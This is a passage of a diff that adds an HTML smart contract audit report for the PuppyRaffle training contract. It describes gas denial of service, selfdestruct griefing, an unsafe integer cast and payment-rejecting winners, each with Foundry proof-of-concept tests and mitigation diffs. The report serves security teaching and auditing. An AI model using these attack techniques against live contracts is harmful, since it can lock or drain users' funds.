+@&gt;      <span class="hljs-keyword">for</span> (uint256 i = <span class="hljs-number">0</span>; i &lt; players.length - <span class="hljs-number">1</span>; i++) {
+            <span class="hljs-keyword">for</span> (uint256 j = i + <span class="hljs-number">1</span>; j &lt; players.length; j++) {
+                <span class="hljs-built_in">require</span>(players[i] != players[j], <span class="hljs-string">"PuppyRaffle: Duplicate player"</span>);
+            }
+        }
+</div></code></pre>
+<details>
+<summary>Proof Of Code</summary>
+Place the following test into `PuppyRaffleTest.t.sol`.
+</details><pre class="hljs"><code><div><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">testReadDuplicateGasCosts</span>(<span class="hljs-params"></span>) <span class="hljs-title">public</span> </span>{
+        vm.txGasPrice(<span class="hljs-number">1</span>);
+
+        <span class="hljs-comment">// We will enter 5 players into the raffle</span>
+        uint256 playersNum = <span class="hljs-number">100</span>;
+        address[] memory players = <span class="hljs-keyword">new</span> address[](playersNum);
+        <span class="hljs-keyword">for</span> (uint256 i = <span class="hljs-number">0</span>; i &lt; playersNum; i++) {
+            players[i] = address(i);
+        }
+        <span class="hljs-comment">// And see how much gas it cost to enter</span>
+        uint256 gasStart = gasleft();
+        puppyRaffle.enterRaffle{<span class="hljs-attr">value</span>: entranceFee * playersNum}(players);
+        uint256 gasEnd = gasleft();
+        uint256 gasUsedFirst = (gasStart - gasEnd) * tx.gasprice;
+        <span class="hljs-built_in">console</span>.log(<span class="hljs-string">"Gas cost of the 1st 100 players:"</span>, gasUsedFirst);
+
+        <span class="hljs-comment">// We will enter 5 more players into the raffle</span>
+        <span class="hljs-keyword">for</span> (uint256 i = <span class="hljs-number">0</span>; i &lt; playersNum; i++) {
+            players[i] = address(i + playersNum);
+        }
+        <span class="hljs-comment">// And see how much more expensive it is</span>
+        gasStart = gasleft();
+        puppyRaffle.enterRaffle{<span class="hljs-attr">value</span>: entranceFee * playersNum}(players);
+        gasEnd = gasleft();
+        uint256 gasUsedSecond = (gasStart - gasEnd) * tx.gasprice;
+        <span class="hljs-built_in">console</span>.log(<span class="hljs-string">"Gas cost of the 2nd 100 players:"</span>, gasUsedSecond);
+
+        assert(gasUsedFirst &lt; gasUsedSecond);
+        <span class="hljs-comment">// Logs:</span>
+        <span class="hljs-comment">//     Gas cost of the 1st 100 players: 6252039</span>
+        <span class="hljs-comment">//     Gas cost of the 2nd 100 players: 18067741</span>
+}
+</div></code></pre>
+
+<p><strong>Recommended Mitigation:</strong> There are a few recommended mitigations.</p>
+<ol>
+<li>Consider allowing duplicates. Users can make new wallet addresses anyways, so a duplicate check doesn't prevent the same person from entering multiple times, only the same wallet address.</li>
+<li>Consider using a mapping to check duplicates. This would allow you to check for duplicates in constant time, rather than linear time. You could have each raffle have a <code>uint256</code> id, and the mapping would be a player address mapped to the raffle Id.</li>
+</ol>
+<pre class="hljs"><code><div><span class="hljs-addition">+    mapping(address =&gt; uint256) public addressToRaffleId;</span>
+<span class="hljs-addition">+    uint256 public raffleId = 0;</span>
+    .
+    .
+    .
+    function enterRaffle(address[] memory newPlayers) public payable {
+        require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
+        for (uint256 i = 0; i &lt; newPlayers.length; i++) {
+            players.push(newPlayers[i]);
+<span class="hljs-addition">+            addressToRaffleId[newPlayers[i]] = raffleId;            </span>
+        }
+
+<span class="hljs-deletion">-        // Check for duplicates</span>
+<span class="hljs-addition">+       // Check for duplicates only from the new players</span>
+<span class="hljs-addition">+       for (uint256 i = 0; i &lt; newPlayers.length; i++) {</span>
+<span class="hljs-addition">+          require(addressToRaffleId[newPlayers[i]] != raffleId, "PuppyRaffle: Duplicate player");</span>
+<span class="hljs-addition">+       }    </span>
+<span class="hljs-deletion">-        for (uint256 i = 0; i &lt; players.length; i++) {</span>
+<span class="hljs-deletion">-            for (uint256 j = i + 1; j &lt; players.length; j++) {</span>
+<span class="hljs-deletion">-                require(players[i] != players[j], "PuppyRaffle: Duplicate player");</span>
+<span class="hljs-deletion">-            }</span>
+<span class="hljs-deletion">-        }</span>
+        emit RaffleEnter(newPlayers);
+    }
+.
+.
+.
+    function selectWinner() external {
+<span class="hljs-addition">+       raffleId = raffleId + 1;</span>
+        require(block.timestamp &gt;= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
+</div></code></pre>
+<p>Alternatively, you could use <a href="https://docs.openzeppelin.com/contracts/4.x/api/utils#EnumerableSet">OpenZeppelin's <code>EnumerableSet</code> library</a>.</p>
+<h3 id="m-2-balance-check-on-puppyrafflewithdrawfees-enables-griefers-to-selfdestruct-a-contract-to-send-eth-to-the-raffle-blocking-withdrawals">[M-2] Balance check on <code>PuppyRaffle::withdrawFees</code> enables griefers to selfdestruct a contract to send ETH to the raffle, blocking withdrawals</h3>
+<p><strong>Description:</strong> The <code>PuppyRaffle::withdrawFees</code> function checks the <code>totalFees</code> equals the ETH balance of the contract (<code>address(this).balance</code>). Since this contract doesn't have a <code>payable</code> fallback or <code>receive</code> function, you'd think this wouldn't be possible, but a user could <code>selfdesctruct</code> a contract with ETH in it and force funds to the <code>PuppyRaffle</code> contract, breaking this check.</p>
+<pre class="hljs"><code><div>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">withdrawFees</span>(<span class="hljs-params"></span>) <span class="hljs-title">external</span> </span>{
+@&gt;      <span class="hljs-built_in">require</span>(address(<span class="hljs-keyword">this</span>).balance == uint256(totalFees), <span class="hljs-string">"PuppyRaffle: There are currently players active!"</span>);
+        uint256 feesToWithdraw = totalFees;
+        totalFees = <span class="hljs-number">0</span>;
+        (bool success,) = feeAddress.call{<span class="hljs-attr">value</span>: feesToWithdraw}(<span class="hljs-string">""</span>);
+        <span class="hljs-built_in">require</span>(success, <span class="hljs-string">"PuppyRaffle: Failed to withdraw fees"</span>);
+    }
+</div></code></pre>
+<p><strong>Impact:</strong> This would prevent the <code>feeAddress</code> from withdrawing fees. A malicious user could see a <code>withdrawFee</code> transaction in the mempool, front-run it, and block the withdrawal by sending fees.</p>
+<p><strong>Proof of Concept:</strong></p>
+<ol>
+<li><code>PuppyRaffle</code> has 800 wei in it's balance, and 800 totalFees.</li>
+<li>Malicious user sends 1 wei via a <code>selfdestruct</code></li>
+<li><code>feeAddress</code> is no longer able to withdraw funds</li>
+</ol>
+<p><strong>Recommended Mitigation:</strong> Remove the balance check on the <code>PuppyRaffle::withdrawFees</code> function.</p>
+<pre class="hljs"><code><div>    function withdrawFees() external {
+<span class="hljs-deletion">-       require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");</span>
+        uint256 feesToWithdraw = totalFees;
+        totalFees = 0;
+        (bool success,) = feeAddress.call{value: feesToWithdraw}("");
+        require(success, "PuppyRaffle: Failed to withdraw fees");
+    }
+</div></code></pre>
+<h3 id="m-3-unsafe-cast-of-puppyrafflefee-loses-fees">[M-3] Unsafe cast of <code>PuppyRaffle::fee</code> loses fees</h3>
+<p><strong>Description:</strong> In <code>PuppyRaffle::selectWinner</code> their is a type cast of a <code>uint256</code> to a <code>uint64</code>. This is an unsafe cast, and if the <code>uint256</code> is larger than <code>type(uint64).max</code>, the value will be truncated.</p>
+<pre class="hljs"><code><div>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">selectWinner</span>(<span class="hljs-params"></span>) <span class="hljs-title">external</span> </span>{
+        <span class="hljs-built_in">require</span>(block.timestamp &gt;= raffleStartTime + raffleDuration, <span class="hljs-string">"PuppyRaffle: Raffle not over"</span>);
+        <span class="hljs-built_in">require</span>(players.length &gt; <span class="hljs-number">0</span>, <span class="hljs-string">"PuppyRaffle: No players in raffle"</span>);
+
+        uint256 winnerIndex = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
+        address winner = players[winnerIndex];
+        uint256 fee = totalFees / <span class="hljs-number">10</span>;
+        uint256 winnings = address(<span class="hljs-keyword">this</span>).balance - fee;
+@&gt;      totalFees = totalFees + uint64(fee);
+        players = <span class="hljs-keyword">new</span> address[](<span class="hljs-number">0</span>);
+        emit RaffleWinner(winner, winnings);
+    }
+</div></code></pre>
+<p>The max value of a <code>uint64</code> is <code>18446744073709551615</code>. In terms of ETH, this is only ~<code>18</code> ETH. Meaning, if more than 18ETH of fees are collected, the <code>fee</code> casting will truncate the value.</p>
+<p><strong>Impact:</strong> This means the <code>feeAddress</code> will not collect the correct amount of fees, leaving fees permanently stuck in the contract.</p>
+<p><strong>Proof of Concept:</strong></p>
+<ol>
+<li>A raffle proceeds with a little more than 18 ETH worth of fees collected</li>
+<li>The line that casts the <code>fee</code> as a <code>uint64</code> hits</li>
+<li><code>totalFees</code> is incorrectly updated with a lower amount</li>
+</ol>
+<p>You can replicate this in foundry's chisel by running the following:</p>
+<pre class="hljs"><code><div>uint256 max = type(uint64).max
+uint256 fee = max + <span class="hljs-number">1</span>
+uint64(fee)
+<span class="hljs-comment">// prints 0</span>
+</div></code></pre>
+<p><strong>Recommended Mitigation:</strong> Set <code>PuppyRaffle::totalFees</code> to a <code>uint256</code> instead of a <code>uint64</code>, and remove the casting. Their is a comment which says:</p>
+<pre class="hljs"><code><div><span class="hljs-comment">// We do some storage packing to save gas</span>
+</div></code></pre>
+<p>But the potential gas saved isn't worth it if we have to recast and this bug exists.</p>
+<pre class="hljs"><code><div><span class="hljs-deletion">-   uint64 public totalFees = 0;</span>
+<span class="hljs-addition">+   uint256 public totalFees = 0;</span>
+.
+.
+.
+    function selectWinner() external {
+        require(block.timestamp &gt;= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
+        require(players.length &gt;= 4, "PuppyRaffle: Need at least 4 players");
+        uint256 winnerIndex =
+            uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
+        address winner = players[winnerIndex];
+        uint256 totalAmountCollected = players.length * entranceFee;
+        uint256 prizePool = (totalAmountCollected * 80) / 100;
+        uint256 fee = (totalAmountCollected * 20) / 100;
+<span class="hljs-deletion">-       totalFees = totalFees + uint64(fee);</span>
+<span class="hljs-addition">+       totalFees = totalFees + fee;</span>
+</div></code></pre>
+<h3 id="m-4-smart-contract-wallet-raffle-winners-without-a-receive-or-a-fallback-will-block-the-start-of-a-new-contest">[M-4] Smart Contract wallet raffle winners without a <code>receive</code> or a <code>fallback</code> will block the start of a new contest</h3>
+<p><strong>Description:</strong> The <code>PuppyRaffle::selectWinner</code> function is responsible for resetting the lottery. However, if the winner is a smart contract wallet that rejects payment, the lottery would not be able to restart.</p>
+<p>Non-smart contract wallet users could reenter, but it might cost them a lot of gas due to the duplicate check.</p>
+<p><strong>Impact:</strong> The <code>PuppyRaffle::selectWinner</code> function could revert many times, and make it very difficult to reset the lottery, preventing a new one from starting.</p>
+<p>Also, true winners would not be able to get paid out, and someone else would win their money!</p>
+<p><strong>Proof of Concept:</strong></p>
+<ol>
+<li>10 smart contract wallets enter the lottery without a fallback or receive function.</li>
+<li>The lottery ends</li>
+<li>The <code>selectWinner</code> function wouldn't work, even though the lottery is over!</li>
+</ol>
+<p><strong>Recommended Mitigation:</strong> There are a few options to mitigate this issue.</p>
+<ol>
+<li>Do not allow smart contract wallet entrants (not recommended)</li>
+<li>Create a mapping of addresses -&gt; payout so winners can pull their funds out themselves, putting the owness on the winner to claim their prize. (Recommended)</li>
+</ol>
+<h2 id="informational--non-critical">Informational / Non-Critical</h2>
+<h3 id="i-1-floating-pragmas">[I-1] Floating pragmas</h3>
+<p><strong>Description:</strong> Contracts should use strict versions of solidity. Locking the version ensures that contracts are not deployed with a different version of solidity than they were tested with. An incorrect version could lead to uninteded results.</p>
+<p>https://swcregistry.io/docs/SWC-103/</p>
+<p><strong>Recommended Mitigation:</strong> Lock up pragma versions.</p>
+<pre class="hljs"><code><div><span class="hljs-deletion">- pragma solidity ^0.7.6;</span>
+<span class="hljs-addition">+ pragma solidity 0.7.6;</span>
+</div></code></pre>
+<h3 id="i-2-magic-numbers">[I-2] Magic Numbers</h3>
+<p><strong>Description:</strong> All number literals should be replaced with constants. This makes the code more readable and easier to maintain. Numbers without context are called &quot;magic numbers&quot;.</p>
+<p><strong>Recommended Mitigation:</strong> Replace all magic numbers with constants.</p>
+<pre class="hljs"><code><div><span class="hljs-addition">+       uint256 public constant PRIZE_POOL_PERCENTAGE = 80;</span>
+<span class="hljs-addition">+       uint256 public constant FEE_PERCENTAGE = 20;</span>
+<span class="hljs-addition">+       uint256 public constant TOTAL_PERCENTAGE = 100;</span>
+.
+.
+.
+<span class="hljs-deletion">-        uint256 prizePool = (totalAmountCollected * 80) / 100;</span>
+<span class="hljs-deletion">-        uint256 fee = (totalAmountCollected * 20) / 100;</span>
+         uint256 prizePool = (totalAmountCollected * PRIZE_POOL_PERCENTAGE) / TOTAL_PERCENTAGE;
+         uint256 fee = (totalAmountCollected * FEE_PERCENTAGE) / TOTAL_PERCENTAGE;
+</div></code></pre>
+<h3 id="i-3-test-coverage">[I-3] Test Coverage</h3>
+<p><strong>Description:</strong> The test coverage of the tests are below 90%. This often means that there are parts of the code that are not tested.</p>
+<pre class="hljs"><code><div>| File                               | % Lines        | % Statements   | % Branches     | % Funcs       |
+| ---------------------------------- | -------------- | -------------- | -------------- | ------------- |
+| script/DeployPuppyRaffle.sol       | 0.00% (0/3)    | 0.00% (0/4)    | 100.00% (0/0)  | 0.00% (0/1)   |
+| src/PuppyRaffle.sol                | 82.46% (47/57) | 83.75% (67/80) | 66.67% (20/30) | 77.78% (7/9)  |
+| test/auditTests/ProofOfCodes.t.sol | 100.00% (7/7)  | 100.00% (8/8)  | 50.00% (1/2)   | 100.00% (2/2) |
+| Total                              | 80.60% (54/67) | 81.52% (75/92) | 65.62% (21/32) | 75.00% (9/12) |
+</div></code></pre>
+<p><strong>Recommended Mitigation:</strong> Increase test coverage to 90% or higher, especially for the <code>Branches</code> column.</p>
+<h3 id="i-4-zero-address-validation">[I-4] Zero address validation</h3>
+<p><strong>Description:</strong> The <code>PuppyRaffle</code> contract does not validate that the <code>feeAddress</code> is not the zero address. This means that the <code>feeAddress</code> could be set to the zero address, and fees would be lost.</p>
+<pre class="hljs"><code><div>PuppyRaffle.constructor(uint256,address,uint256)._feeAddress (src/PuppyRaffle.sol#57) lacks a zero-check on :
+                - feeAddress = _feeAddress (src/PuppyRaffle.sol#59)
+PuppyRaffle.changeFeeAddress(address).newFeeAddress (src/PuppyRaffle.sol#165) lacks a zero-check on :
+                - feeAddress = newFeeAddress (src/PuppyRaffle.sol#166)
+</div></code></pre>
+<p><strong>Recommended Mitigation:</strong> Add a zero address check whenever the <code>feeAddress</code> is updated.</p>
+<h3 id="i-5-isactiveplayer-is-never-used-and-should-be-removed">[I-5] _isActivePlayer is never used and should be removed</h3>
+<p><strong>Description:</strong> The function <code>PuppyRaffle::_isActivePlayer</code> is never used and should be removed.</p>
+<pre class="hljs"><code><div><span class="hljs-deletion">-    function _isActivePlayer() internal view returns (bool) {</span>
+<span class="hljs-deletion">-        for (uint256 i = 0; i &lt; players.length; i++) {</span>
+<span class="hljs-deletion">-            if (players[i] == msg.sender) {</span>
+<span class="hljs-deletion">-                return true;</span>
+<span class="hljs-deletion">-            }</span>
+<span class="hljs-deletion">-        }</span>
+<span class="hljs-deletion">-        return false;</span>
+<span class="hljs-deletion">-    }</span>
+</div></code></pre>
+<h3 id="i-6-unchanged-variables-should-be-constant-or-immutable">[I-6] Unchanged variables should be constant or immutable</h3>
+<p>Constant Instances:</p>
+<pre class="hljs"><code><div>PuppyRaffle.commonImageUri (src/PuppyRaffle.sol#35) should be constant 
+PuppyRaffle.legendaryImageUri (src/PuppyRaffle.sol#45) should be constant 
+PuppyRaffle.rareImageUri (src/PuppyRaffle.sol#40) should be constant 
+</div></code></pre>
+<p>Immutable Instances:</p>
+<pre class="hljs"><code><div>PuppyRaffle.raffleDuration (src/PuppyRaffle.sol#21) should be immutable
+</div></code></pre>
+<h3 id="i-7-potentially-erroneous-active-player-index">[I-7] Potentially erroneous active player index</h3>
+<p><strong>Description:</strong> The <code>getActivePlayerIndex</code> function is intended to return zero when the given address is not active. However, it could also return zero for an active address stored in the first slot of the <code>players</code> array. This may cause confusions for users querying the function to obtain the index of an active player.</p>
+<p><strong>Recommended Mitigation:</strong> Return 2**256-1 (or any other sufficiently high number) to signal that the given player is inactive, so as to avoid collision with indices of active players.</p>
+<h3 id="i-8-zero-address-may-be-erroneously-considered-an-active-player">[I-8] Zero address may be erroneously considered an active player</h3>
+<p><strong>Description:</strong> The <code>refund</code> function removes active players from the <code>players</code> array by setting the corresponding slots to zero. This is confirmed by its documentation, stating that &quot;This function will allow there to be blank spots in the array&quot;. However, this is not taken into account by the <code>getActivePlayerIndex</code> function. If someone calls <code>getActivePlayerIndex</code> passing the zero address after there's been a refund, the function will consider the zero address an active player, and return its index in the <code>players</code> array.</p>
+<p><strong>Recommended Mitigation:</strong> Skip zero addresses when iterating the <code>players</code> array in the <code>getActivePlayerIndex</code>. Do note that this change would mean that the zero address can <em>never</em> be an active player. Therefore, it would be best if you also prevented the zero address from being registered as a valid player in the <code>enterRaffle</code> function.</p>
+<h2 id="gas-optional">Gas (Optional)</h2>
+<p>// TODO</p>
+<ul>
+<li>
+<p><code>getActivePlayerIndex</code> returning 0. Is it the player at index 0? Or is it invalid.</p>
+</li>
+<li>
+<p>MEV with the refund function.</p>
+</li>
+<li>
+<p>MEV with withdrawfees</p>
+</li>
+<li>
+<p>randomness for rarity issue</p>
+</li>
+<li>
+<p>reentrancy puppy raffle before safemint (it looks ok actually, potentially informational)</p>
+</li>
+</ul>
+
+</body>
+</html>
